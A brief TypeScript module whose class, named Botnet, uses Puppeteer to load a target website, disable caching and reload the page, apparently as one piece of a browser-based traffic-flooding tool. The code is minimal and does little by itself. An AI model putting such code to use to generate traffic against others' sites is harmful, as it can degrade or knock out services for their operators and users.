import {Browser} from 'puppeteer' 
import {v4 as uuidv4} from 'uuid'

class Botnet {

    async createBotnet(browser: Browser, websiteTarget: string, time: number) {
        const page = await browser.newPage();
        await page.setDefaultNavigationTimeout(300 * 1000)
        await page.goto(websiteTarget, {waitUntil: 'load', timeout: 0});
        await page.setCacheEnabled(false)
        await page.reload({timeout: time * 1000})
        // await page.screenshot({path: `Test/${uuidv4()}.png`});
    }
}

export default new Botnet